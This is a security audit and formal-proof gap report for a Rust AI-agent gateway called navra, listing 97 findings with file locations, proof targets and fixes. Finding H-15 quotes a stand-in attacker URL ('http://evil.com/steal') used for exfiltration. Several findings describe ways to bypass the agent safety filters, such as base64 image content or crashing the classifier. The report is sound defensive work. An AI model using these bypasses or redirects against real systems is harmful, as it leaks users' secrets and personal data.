# Formal Proof Gap Analysis — navra

**Date**: 2026-06-17
**Scope**: Full project, 141,783 lines of Rust across 25 crates
**Method**: Line-by-line analysis by 5 specialized agents + lead
review of security-critical paths, unsafe code, invariant
enforcement, and Kani proof coverage

## Executive Summary

navra has **139 Kani proofs across 15 of 25 crates** — substantially
above typical Rust projects. The IFC lattice (label.rs) has
exhaustive formal verification covering all algebraic properties.
However, significant gaps remain in enforcement boundaries,
cryptographic primitives, ML failure modes, state machine
completeness, delegation validation, and transport-layer DoS.

| Severity | Count |
|----------|-------|
| Critical | 7 |
| High | 24 |
| Medium | 38 |
| Low | 28 |
| **Total** | **97** |

---

## 1. CRITICAL: Cryptographic & Safety Primitives

### C-1. constant_time_eq leaks length (CWE-208)

**Files**: `navra-auth/src/auth/mod.rs:119-124`,
`navra-auth/src/auth/oauth.rs:570-578`
**Category**: cryptographic-weakness

Two duplicate implementations return `false` immediately when lengths
differ, leaking the length of the stored secret through timing.

```rust
fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() { return false; }  // ← timing leak
    a.iter().zip(b).fold(0u8, |acc, (x, y)| acc | (x ^ y)) == 0
}
```

The `subtle` crate is not in dependencies. The project hand-rolls
constant-time comparison without a vetted implementation.

**Proof target**: execution time independent of input content AND
length. Use `subtle::ConstantTimeEq`.

### C-2. Secret zeroization optimizable away

**File**: `navra-auth/src/credentials.rs:47-54`
**Category**: cryptographic-weakness

Manual zeroing loop is a dead store the compiler may elide. The
`zeroize` crate (volatile writes) is not used.

**Proof target**: after `drop()`, secret bytes are zero. Requires
`zeroize` crate or `std::ptr::write_volatile`.

### C-3. Canonical JSON for witness signing is non-deterministic

**File**: `navra-auth/src/ifc/witness.rs:30-38`
**Category**: invariant-not-enforced

`serde_json::json!` → `to_vec` key order is an implementation detail.
A future serde_json version could produce different bytes for the
same witness, breaking signature verification.

**Proof target**: `canonical_payload()` produces identical bytes for
identical inputs regardless of serde internals. Use JCS (RFC 8785)
or CBOR deterministic encoding.

### C-4. Non-text content bypasses entire safety pipeline

**Files**: `navra-core/src/server/handlers.rs:830-836`,
`navra-safety-hooks/src/hooks/safety_hook.rs:136-138`
**Category**: security-bypass-path

Image, Resource, Audio content types pass through unexamined with
only a `tracing::warn!`. A tool returning secrets as base64 image
content evades all PII detection, secret scanning, and IFC labeling.

**Proof target**: for all content types in tool results, the safety
pipeline examines or blocks the content.

### C-5. ML inference failure defaults to allow

**Files**: `navra-safety/src/ml.rs:71-73` (MlFilter),
`navra-safety/src/ml.rs:234-236` (MultiLabelFilter)
**Category**: security-bypass-path

When the ML classifier fails (network error, OOM, model corruption),
`scan()` returns empty findings — content passes unfiltered. An
attacker who can crash inference (e.g., adversarial input causing
ONNX OOM) bypasses all ML-based content safety.

**Proof target**: `∀ content, model_error ⇒ pipeline ≠ Pass`. Failure
must default to deny.

### C-6. NER/Privacy filter inference failure also defaults to allow

**Files**: `navra-safety/src/ner.rs:925-929`,
`navra-safety/src/privacy_filter.rs:407-412`
**Category**: security-bypass-path

Same fail-open pattern. PII flows undetected when ONNX inference
fails. These are sync `ContentFilter` implementations — failure looks
like "no PII found" rather than "couldn't check."

**Proof target**: distinguish "no PII found" from "detection failed."

### C-7. validate_delegation missing path AND tool subset checks

**File**: `navra-auth/src/auth/capability.rs:339-421`
**Category**: invariant-not-enforced

`validate_delegation()` checks operations, credentials, ring, expiry,
OBO, and sandbox — but does NOT check that the child token's `paths`
or `tools` are subsets of the parent's. A child token can declare
`paths: ["/**"]` or `tools: ["*"]` even when the parent is restricted.
The `build_delegated_payload()` function inherits paths wholesale
(safe for the builder), but `validate_delegation()` is the
enforcement point for externally-constructed tokens.

**Proof target**: `∀ (parent, child): validate_delegation(parent,
child, _).is_ok() ⇒ child.cap.paths ⊆ parent.cap.paths ∧
child.cap.tools ⊆ parent.cap.tools` (under glob semantics).

---

## 2. HIGH: IFC Enforcement Gaps

### H-1. is_write_tool heuristic is a bypassable denylist

**File**: `navra-auth/src/ifc/mod.rs:205-225`

Substring matching (`contains("write")`, etc.) misses tools named
`update_record`, `create_file`, `api_post`. Same problem for
`is_external_read_tool` at line 287-300.

**Proof target**: deny-by-default for unannotated tools.

### H-2. TaintedWritePolicy::from_str defaults to Allow on unknown

**File**: `navra-auth/src/ifc/mod.rs:154-161`

Typos (`"denny"`, `"Deny"`) silently become the most permissive
policy. Case-sensitive matching.

### H-3. Missing IFC policy = no enforcement (fail-open)

**File**: `navra-core/src/server/handlers.rs:528-559`

`self.ifc_policies.get(&ctx.agent.permissions)` — missing HashMap
entry falls to `_ => {}` (Allow). A new permission set without IFC
config gets zero enforcement.

**Proof target**: `∀ permission_sets ps: ifc_policies.get(ps).
is_none() ⇒ write is denied`.

### H-4. IFC taint not enforced on stateless requests

**File**: `navra-core/src/transport/streamable/dispatch.rs:560+`

Stateless dispatch creates a fresh `TaintTracker` per request.
Cross-request taint does not accumulate, violating INV-1.

### H-5. Declassify has no authority verification

**File**: `navra-auth/src/ifc/mod.rs:88-113`

`TaintTracker::declassify()` accepts any `&str` as the declassifier.
Any code with `&mut TaintTracker` can declassify by passing
`"pii-filter"`. Convention, not type-level guarantee.

**Proof target**: `declassify()` callable only from within trusted
modules. The declassifier string must correspond to a registered
authority.

### H-6. IFC label metadata leaked to agents

**File**: `navra-core/src/server/handlers.rs:742-746`

`_var: {var_id} (label: {label})_` appended to every tool result
as visible text. A malicious agent can parse these to understand
data classification.

---

## 3. HIGH: Safety Pipeline Gaps

### H-7. ONNX session mutex poisoning crashes all inference

**Files**: `navra-safety/src/ner.rs:622`,
`navra-safety/src/privacy_filter.rs:335`,
`navra-model/src/onnx.rs:203`

All use `.unwrap()` on the Mutex guard. One panicked thread poisons
the mutex; all subsequent unwrap calls cascade-panic, killing all
inference on that model. Should use `unwrap_or_else(|e| e.into_inner())`
or propagate.

### H-8. Threshold not validated in [0.0, 1.0]

**Files**: `navra-safety/src/ml.rs:33,131`,
`navra-safety/src/ner.rs:396`,
`navra-safety/src/privacy_filter.rs:258`

Bare `f32` accepted. `NaN` makes comparisons always false (nothing
triggers). `> 1.0` makes the filter unable to fire on softmax output.
Kani proofs check `is_finite()` but runtime does not.

### H-9. Finding byte offsets may split UTF-8

**File**: `navra-safety/src/lib.rs:605-650`

`redact()` and `pseudonymize()` index into content using byte offsets
from `Finding.start/end`. If offsets land mid-character (possible
with non-ASCII input and tokenizer mismatch), slicing panics.

**Proof target**: `∀ finding: content.is_char_boundary(finding.start)
∧ content.is_char_boundary(finding.end)`.

### H-10. Inbound safety filter only checks named fields

**File**: `navra-safety-hooks/src/hooks/safety_hook.rs:72-77`

Pre-hook only checks `"content"`, `"new_string"`, `"text"` fields.
A write tool using `"body"`, `"data"`, `"payload"`, `"message"` is
unfiltered.

### H-11. SafeModelBackend only wraps respond()

**File**: `navra-model/src/safe_backend.rs:56-95`

Does not override `embed()`, `classify()`, `generate()`,
`respond_stream()`, `transcribe()`, or `synthesize()`. Calls to
those go directly to the inner backend without safety filtering.

### H-12. Model hub pulls untrusted data without integrity check

**File**: `navra-model-hub/src/lib.rs:98-99`

`pull()` downloads model bytes and stores them with content-addressed
SHA-256 — but the hash is computed FROM the downloaded bytes, not
verified against a known-good digest. No signature verification, no
digest pinning. A MITM could serve a model that classifies everything
as "safe."

---

## 4. HIGH: Transport & Protocol Gaps

### H-13. Session flooding via repeated initialize

**File**: `navra-core/src/server/handlers.rs:189-229`

`handle_initialize` creates a new session with UUID on every call.
No cap. A client can create unlimited sessions.

**Proof target**: `∀ agent: count(sessions) ≤ MAX`.

### H-14. Stdio transport: no line length limit

**File**: `navra-protocol/src/upstream/stdio.rs:157-199`

`read_line(&mut buf)` reads until newline with no size limit.
Malicious subprocess sends line without newline → unbounded memory.

### H-15. SSE endpoint URL injection

**File**: `navra-protocol/src/upstream/sse.rs:96-108`

SSE endpoint URL from server used directly for POST without origin
validation. Server returning `data: http://evil.com/steal` causes
the client to POST JSON-RPC requests (with tool arguments) to that
URL.

**Proof target**: `∀ post_url: same_origin(post_url, base_url)`.

### H-16. SSE/HTTP full response body read into memory

**File**: `navra-protocol/src/upstream/sse.rs:83,158`

`resp.text().await` — no size limit. Multi-GB response causes OOM.

---

## 5. HIGH: Tool Security Gaps

### H-17. exec workspace path check: string prefix, not directory

**File**: `navra-tools-exec/src/tools.rs:87-89`

`starts_with("/workspace")` accepts `/workspacefoo`,
`/workspace/../etc`. No canonicalization, no `..` rejection.

**Proof target**: `∀ path: passes_check(path) ⇒
canonicalize(path).starts_with("/workspace/")`.

### H-18. DAG back-edge cascading creates unbounded re-execution

**File**: `navra-flow/src/executor.rs:285-628`

Per-edge `max_iterations` but no global cycle detection across
back-edge chains. A→B→C→A through three edges doesn't hit any
single edge's limit.

**Proof target**: `∀ DAG with back-edges: total_executions ≤
bounded_function(tasks, max_iterations)`.

### H-19. GitLab tools have zero permission checks

**File**: `navra-tools-gitlab/src/tools.rs:81-298`

Unlike git tools which check via `PermissionEngine`, GitLab tools
allow any agent to create MRs, issues, comments without
authorization. `_ctx: CallContext` received but never used.

### H-20. Git symlink TOCTOU

**File**: `navra-tools-git/src/tools.rs:486-498`

Three separate filesystem operations (`is_symlink()`, `read_link()`,
`canonicalize()`). Between checks, symlink target can be atomically
swapped.

---

## 6. HIGH: Auth / Delegation Gaps

### H-21. NoAuthenticator in production path

**File**: `navra-server/src/main.rs:1005-1023`

When no agents configured, anonymous access with "readonly"
permissions. Any TCP connection is authenticated as legitimate.

### H-22. decode_token_unchecked is pub, not test-gated

**File**: `navra-auth/src/auth/capability.rs:257`

`#[doc(hidden)]` hides from docs but remains accessible. Public
function that bypasses signature AND expiry verification.

### H-23. Capability token not transport-bound

**File**: `navra-auth/src/auth/capability.rs:195-244`

No IP/TLS binding. Stolen token replayable from any network location.

### H-24. Delegation depth is caller-supplied, not token-embedded

**File**: `navra-auth/src/auth/capability.rs:411-416`

`max_depth` is a parameter to the function, not in the
`CapabilityPayload`. A validator can pass any value. No mechanism to
enforce delegation depth limits from the token chain itself.

---

## 7. MEDIUM Gaps (38 total)

### M-1 through M-38

| # | File | Description |
|---|------|-------------|
| M-1 | `ifc/mod.rs:188` | `ReadClearance::from_config` defaults unknown level to Secret (fail-open for read) |
| M-2 | `ifc/mod.rs:287-300` | `is_external_read_tool` denylist equally incomplete |
| M-3 | `ifc/witness.rs:25` | Witness signing optional — unsigned passes through audit trail |
| M-4 | `ifc/value_store.rs:185-197` | `get_or_create` read-then-write TOCTOU |
| M-5 | `trust_score.rs:82-87` | `Ordering::Relaxed` read-modify-write loses concurrent penalties |
| M-6 | `server/handlers.rs:830` | Non-text content bypasses safety (duplicate of C-4) |
| M-7 | `blackbox.rs:164-165` | Two mutexes, no lock-ordering enforcement |
| M-8 | `blackbox.rs:192` | `let _ =` silences audit trail insert failures |
| M-9 | `agent/quota.rs:60-92` | Quota check-then-update TOCTOU |
| M-10 | `hibernate.rs:42` | `as_secs() as i64` truncation |
| M-11 | `anthropic.rs:199` | `u64 as u32` token count truncation |
| M-12 | `jsonrpc.rs:17` | `jsonrpc` field not validated to `"2.0"` |
| M-13 | `jsonrpc.rs:165-170` | Batch request no size limit |
| M-14 | `jsonrpc.rs:17-23` | Method name/params no size limit |
| M-15 | `dispatch.rs:612-633` | Stateless mode creates sessions without bound |
| M-16 | `dispatch.rs:125-139` | `tools/list` doesn't use dynamic IFC-aware filter |
| M-17 | `direct_transport.rs:29-106` | DirectTransport bypasses session validation |
| M-18 | `handlers.rs:321-323` | Tool name glob metacharacters not sanitized |
| M-19 | `permissions.rs:38` | Permission request ID caller-controlled (collision/race) |
| M-20 | `mcp.rs:325-346` | `compress()` can split UTF-8 sequences |
| M-21 | `upstream/http.rs:131,166` | Error messages may leak upstream internals |
| M-22 | `a2a.rs:157-163` | `FileContent::Uri` arbitrary URIs (SSRF) |
| M-23 | `rag/store.rs:286` | chunks/embeddings length mismatch silently truncates |
| M-24 | `rag/store.rs:274-312` | Non-transactional index_document — partial writes |
| M-25 | `rag/store.rs:367` | FTS5 query injection via user-controlled text |
| M-26 | `rag/store.rs:790` | LIKE injection in GDPR erasure |
| M-27 | `memory/knowledge.rs:417` | Consent basis not validated as enum |
| M-28 | `macros/lib.rs:246` | Unknown type silently maps to JSON `"string"` |
| M-29 | `modal-vision/tools.rs:85` | MIME by extension not magic bytes |
| M-30 | `modal-vision/tools.rs:295` | Screenshot path TOCTOU with symlinks |
| M-31 | `modal-vision/tools.rs:67` | No decompression bomb protection |
| M-32 | `modal-voice/audio.rs:101` | Samples vector grows unboundedly during recording |
| M-33 | `modal-voice/audio.rs:141` | Mutex lock in real-time audio callback |
| M-34 | `safety/lib.rs:102` | CUSTOM_PII_CATEGORIES mutex poisoning degrades silently |
| M-35 | `safety/classifier.rs:46` | NaN score → `is_unsafe()` returns false |
| M-36 | `tools-git/tools.rs:459` | `resolve_repo_path` doesn't catch URL-encoded `..` |
| M-37 | `tools-gitlab/tools.rs:119` | Branch names not validated (flag injection) |
| M-38 | `openapi/handler.rs:50` | Unbounded response body read into memory |

---

## 8. LOW Gaps (28 total)

| # | File | Description |
|---|------|-------------|
| L-1 | `builder.rs:163,184,205,420` | Panic in builder on misconfiguration |
| L-2 | `handlers.rs:111` | `unused_tools()` always returns empty set (stub) |
| L-3 | `blackbox.rs:75` | Silenced schema migration |
| L-4 | `capability.rs:136-165` | Revocation list has no size bound or expiry |
| L-5 | `execution_ring.rs:41` | `min()` for ring selection is confusing (correct but misleading) |
| L-6 | `jsonrpc.rs:35-43` | Response can have both result AND error |
| L-7 | `jsonrpc.rs:8-13` | RequestId accepts arbitrary-length strings |
| L-8 | `a2a.rs:346-353` | `now_iso8601()` produces non-ISO format |
| L-9 | `dispatch.rs:114-117` | Notification handling sends response |
| L-10 | `dispatch.rs:101-104` | Serialization failures return as success |
| L-11 | `responses/request.rs:76` | `extra` flattened HashMap unbounded |
| L-12 | `upstream/stdio.rs` | Stdio transport: no authentication |
| L-13 | `tool_loop.rs:982` | Loop detector exclusion list is hardcoded |
| L-14 | `tool_loop.rs:1072` | Rate circuit breaker warns but doesn't stop |
| L-15 | `tool_loop.rs:1127` | Malformed JSON args silently become `{}` |
| L-16 | `tool_loop.rs:1280` | `warn_if_sensitive` only warns, no redaction |
| L-17 | `engine.rs:335` | Flow engine clones input every iteration (quadratic) |
| L-18 | `engine.rs:213-268` | Flow handoff has no forward-progress check |
| L-19 | `executor.rs:330` | `max_concurrent` field unused (dead config) |
| L-20 | `dag.rs:113-165` | Kahn's sort is O(V² log V) not O(V+E) |
| L-21 | `ner.rs:44,72` | Duplicate "TITLE" match arm (first wins, second dead) |
| L-22 | `onnx.rs:355` | `Box::leak` for HETERO string (startup-only) |
| L-23 | `safety/lib.rs:291` | PiiMetrics `Relaxed` ordering — inconsistent snapshots |
| L-24 | `safety/lib.rs:416` | `process_inbound == process_outbound` (no directional diff) |
| L-25 | `rag/store.rs:610` | LIKE wildcards unescaped in tag filter |
| L-26 | `memory/knowledge.rs:739` | `touch()` succeeds silently on nonexistent ID |
| L-27 | `macros/lib.rs:527` | `parse_default` doesn't handle f64 |
| L-28 | `macros/lib.rs:158` | `#[arg(name)]` no uniqueness validation |

---

## 9. Formal Verification Status

### What is formally proven (Kani)

139 proofs across 15 crates. Strongest areas:

| Domain | Proofs | Properties |
|--------|--------|-----------|
| IFC Lattice | 18 | Join commutativity/associativity/idempotency/monotonicity, BLP dual, write-down preservation, discriminant safety, bottom/top, hash/eq, display uniqueness |
| Taint Tracker | 7 | Monotonicity (single + sequence), PII→Sensitive implication, absorb=join, noninterference, declassify-only-steps-down |
| Capability Tokens | 8 | Attenuation, ring monotonicity, expiry invariants |
| ACL | 6 | Deny-wins, empty-ACL-denies |
| Trust Score | 6 | Boundedness, monotonicity |
| Risk Tier | 6 | Ordering, composition |
| Tool Scanner | 4 | Classification correctness |
| Blackbox | 5 | Chain invariants |
| Safety Pipeline | 4 | Decision consistency |
| Temporal Contract | 4 | Enforcement invariants |
| Others | 71 | Various per-crate properties |

### What needs Kani proofs (by priority)

| Priority | Property | Crate |
|----------|----------|-------|
| P0 | ML failure → deny (not allow) | navra-safety |
| P0 | validate_delegation ⊆ check for paths/tools | navra-auth |
| P0 | Non-text content → blocked or examined | navra-core |
| P1 | DAG back-edge termination bound | navra-flow |
| P1 | Session count bounded per agent | navra-core |
| P1 | Token expiry never panics (pre-epoch) | navra-auth |
| P1 | Threshold ∈ [0.0, 1.0] ∧ !NaN | navra-safety |
| P2 | Blackbox append-only property | navra-core |
| P2 | Pipeline Block never overridden | navra-safety-hooks |
| P2 | Embedding dimension invariant | navra-rag |
| P2 | Cross-request taint monotonicity | navra-core |
| P3 | Server config validation | navra-server |
| P3 | Proc macro code generation | navra-macros |
| P3 | MCP state machine transitions | navra-protocol |

### Crates with zero Kani proofs (10 of 25)

navra-mcp, navra-openapi, navra-tools-git, navra-tools-gitlab,
navra-responses, navra-macros, navra-modal-vision, navra-server,
navra-memory (partial — only decay.rs), navra-cognitive (partial —
only budget.rs)

---

## 10. Verification Coverage Matrix

| Domain | Unit | Kani | Integration | E2E | Key Gap |
|--------|------|------|-------------|-----|---------|
| IFC Lattice | ✅ | ✅ 18 | ✅ | ✅ | **None** |
| Taint Tracker | ✅ | ✅ 7 | ✅ | ✅ | Stateless path, declassify auth |
| Capability Tokens | ✅ | ✅ 8 | ✅ | — | **Delegation subset**, transport binding |
| ACL | ✅ | ✅ 6 | ✅ | — | Glob escaping, path traversal |
| Safety Pipeline | ✅ | ✅ 4 | ✅ | ✅ | **Non-text bypass**, **fail-open on ML error** |
| Hook Pipeline | ✅ | ✅ 4 | ✅ | — | Block override, named-field-only |
| Blackbox Chain | ✅ | ✅ 5 | — | — | Append-only, concurrent safety |
| Trust Score | ✅ | ✅ 6 | — | — | Relaxed ordering |
| Risk Tier | ✅ | ✅ 6 | — | — | Complete |
| Tool Scanner | ✅ | ✅ 4 | — | — | — |
| DAG Execution | ✅ | ✅ 0 | ✅ | — | **Back-edge termination** |
| Server Dispatch | ✅ | ✅ 0 | ✅ | ✅ | **Session flooding**, config safety |
| Model Backends | ✅ | ✅ 3 | — | — | **Untrusted model pull**, NaN |
| Memory/RAG | ✅ | ✅ 3 | — | — | **Dimension mismatch**, thread safety |
| Agent Loop | ✅ | ✅ 7 | ✅ | — | Sensitive data warnings only |
| Credential Store | ✅ | ✅ 0 | — | — | **Zeroization** |
| OAuth | ✅ | ✅ 0 | — | — | CSRF state |
| Transport | ✅ | ✅ 0 | ✅ | ✅ | **Unbounded reads**, SSE injection |
| Tool Exec | ✅ | ✅ 2 | — | — | **Workspace prefix** |
| Tool Git | ✅ | ✅ 0 | — | — | TOCTOU, URL-encoded `..` |
| Tool GitLab | ✅ | ✅ 0 | — | — | **Zero permission checks** |

---

## 11. Recommended Actions

### P0 — Fix before next release
1. Replace hand-rolled `constant_time_eq` with `subtle::ConstantTimeEq`
2. Replace manual zeroization with `zeroize` crate
3. Block or examine non-text content in safety pipeline
4. Make ML/NER/Privacy filter failure default to **deny**
5. Add path/tool subset validation to `validate_delegation()`
6. Make `TaintedWritePolicy::from_str` reject unknown strings
7. Fix `starts_with("/workspace")` → proper directory-prefix check

### P1 — Add Kani proofs
8. `validate_delegation` path ⊆ and tool ⊆ under glob semantics
9. ML failure → pipeline blocks (not passes)
10. DAG back-edge termination bound
11. Session count per agent is bounded
12. Safety pipeline Block never overridden
13. Token expiry never panics on pre-epoch clocks
14. Threshold ∈ [0.0, 1.0] ∧ !NaN

### P2 — Strengthen enforcement
15. Change `is_write_tool` to deny-by-default for unannotated tools
16. Add transport binding (audience claim) to capability tokens
17. Fix TOCTOU in quota check-then-update
18. Merge blackbox's two mutexes into one
19. Default IFC policy to Deny (not Allow) when config missing
20. Add embedding dimension assertion at insert AND search
21. Wrap memory store Connection in Mutex
22. Add line-length limits to stdio/SSE transports
23. Add permission checks to GitLab tools
24. Validate SSE endpoint URL origin before POST

### P3 — Expand coverage
25. Add Kani proofs to navra-server config parsing
26. Add Kani proofs to navra-macros code generation
27. Introduce proptest for string-heavy parsers
28. Switch witness canonical encoding to JCS/CBOR
29. Add decompression bomb protection to vision tools
30. Use lock-free channels for real-time audio callbacks
